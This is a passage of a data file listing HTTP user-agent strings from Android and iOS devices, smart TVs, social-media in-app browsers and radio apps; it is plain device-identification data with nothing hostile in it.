Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; CPH2307 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX2 Build/HONORRKY-L32)","Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","TuneIn Radio/25.2.1; iPhone14,6; iOS/16.2","Mozilla/5.0 (Linux; Android 10; POT-LX1T Build/HUAWEIPOT-L21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.20E252 (iPad; U; CPU OS 16_4_1 like Mac OS X; sv_se)","Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.15G77 (iPhone; U; CPU OS 11_4_1 like Mac OS X; cs_cz)","Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.140 Safari/537.36 OPR/46.0.2207.0 OMI/4.21.2.50.Honey.214 Model/Hisense-NT72671D VIDAA/6.0(Hisense;SmartTV;75A60GEVS;NT72671/V0000.01.00R.N0113;UHD;75A6GE;)","Mozilla/5.0 (Linux; Android 13; SM-F707B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-A236B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E247 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.4;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]","Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/401.0.0.38.92;FBBV/458227070;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/2;FBCR/;FBID/phone;FBLC/it;FBOP/0]","Mozilla/5.0 (Linux; Android 12; LM-G900 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Nokia 8 Sirocco Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone13,4; iOS/16.2","Mozilla/5.0 (Linux; Android 13; CPH2219 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","TuneIn Radio/25.2.1; iPhone10,6; iOS/16.4","TuneIn Radio Pro/25.2.1; iPhone15,2; iOS/16.4.1","Mozilla/5.0 (Linux; Android 11; RMX3503 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.13A452 (iPhone; U; CPU OS 9_0_2 like Mac OS X; hu_hu)","Mozilla/5.0 (Linux; Android 9; A5_Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A136B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Config/95.2.9701.2","Mozilla/5.0 (Linux; Android 10; A3X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J330F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 11; NTH-NX9 Build/HONORNTH-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; Redmi 7 Build/QKQ1.191008.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; motorola one fusion+ Build/QPIS30.73-33-6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","TuneIn Radio/25.2.1; iPad7,5; iPadOS/16.1.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H321 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.4;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5]","Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/174.1.391956124 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 10; 5002M Build/QKQ1.200623.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4302360304)","TuneIn Radio/24.8.1; iPad7,6; iPadOS/16.1","radio.it 5.6.20 (iPhone; iPhone OS 16.5; it_IT)","Mozilla/5.0 (Linux; Android 9; ASUS_X00TD Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; H8416) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2007J3SG Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.149 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; 2107113SG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022118458","TuneIn Radio/25.2.1; iPhone11,2; iOS/16.4.1","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; hr_hr)","Mozilla/5.0 (Linux; Android 13; V2041 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 GNews Android/2022108570","Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-J730GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 5.0.2; P021 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone12,1; iOS/16.4.1","TuneIn Radio/25.2.1; iPhone13,3; iOS/16.4.1","Mozilla/5.0 (Linux; Android 11; 5033D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; SM-A217F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPad; CPU OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPad12,1;FBMD/iPad;FBSN/iPadOS;FBSV/16.1.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5];FBNV/1","Mozilla/5.0 (Linux; Android 9; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]","Mozilla/5.0 (Linux; Android 13; SM-T220 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022116172","Mozilla/5.0 (Linux; Android 12; SM-T220) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMP2102 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022122934","TuneIn Radio/25.2.1; iPad12,2; iPadOS/16.3.1","Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2269 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 HuaweiBrowser/13.0.3.301 HMSCore/6.10.0.312","Mozilla/5.0 (Linux; Android 13; SM-N770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-N976N Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SurfTab xiron 7.0 3G Build/ST70404-1_20150124_INT)","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 GNews Android/2022095814","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/407.1.0.42.94;FBBV/458594382;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/463479008]","Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5) Plus Build/OPS28.85-17-6-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPad13,6; iPadOS/16.4","Mozilla/5.0 (Linux; Android 12; LM-K520 Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.PIXEL_UNICORN3.94 HbbTV/1.4.1 (+DRM;Sony; KDL-32WE613; v8.631-1000; ;2017LE;) FVC/2.0 (Sony;2017LE;)  sony.hbbtv.tv.2017LE","Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901B/S901BXXU2AVG6) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CPH1917 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; A60 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4306541344)","Mozilla/5.0 (Linux; Android 12; 2201117TY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.1.115;]","Mozilla/5.0 (Linux; Android 12; XQ-BE52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; Moto G Play Build/NPIS26.48-43-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 GNews Android/2022102432","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62 Herring/93.1.5390.91","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.149 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; DUK-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 GNews Android/2022116172","Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; EVA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","AppleCoreMedia/1.0.0.22E261 (Macintosh; U; Intel Mac OS X 13_3_1; en_us)","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone12,5; iOS 16_3_1; nl_NL; nl; scale=3.00; 1242x2688; 462633398) NW/3","Mozilla/5.0 (Linux; Android 11; SM-G973F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; RMX2155) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Dalvik/2.1.0 (Linux; U; Android 9; Hyundai 2K Android TV Build/PTO6.201222.001)","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2207.0 OMI/4.11.3.57.Martell-3.133 Model/Hisense-MT5659-SDK4-11 (;Hisense;SmartTV;V0100.01.00A.M0111;HE40E5600FFWTS) FXM-U2FsdGVkX1+21znnd51V34QWaPN6cgMR9R3vQtCXOcrM2dFQI7lU/iADnGnpE6I8-END","Mozilla/5.0 (Linux; Android 12; 220333QL Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/nl_Qaau_NL;FBOP/5]","TuneIn Radio/24.7.0; iPad7,5; iPadOS/16.4","Mozilla/5.0 (Linux; Android 12; CPH2333) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Archos 101 Oxygen 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","radio.de 5.6.20 (iPhone; iPhone OS 16.4.1; de_DE)","Mozilla/5.0 (Linux; Android 8.1.0; SM-G390F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Simple%20Radio/1919 CFNetwork/1406.0.4 Darwin/22.4.0","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RON31.267-94)","Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 GNews Android/2022102432","Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.24 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.6.115;]","Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M2012K10C Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone10,4; iOS 16_0_2; it_IT; it-IT; scale=2.00; 750x1334; 462633398)","Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","TuneIn Radio/25.2.1; iPad7,5; iPadOS/16.4","Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; S88Plus Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 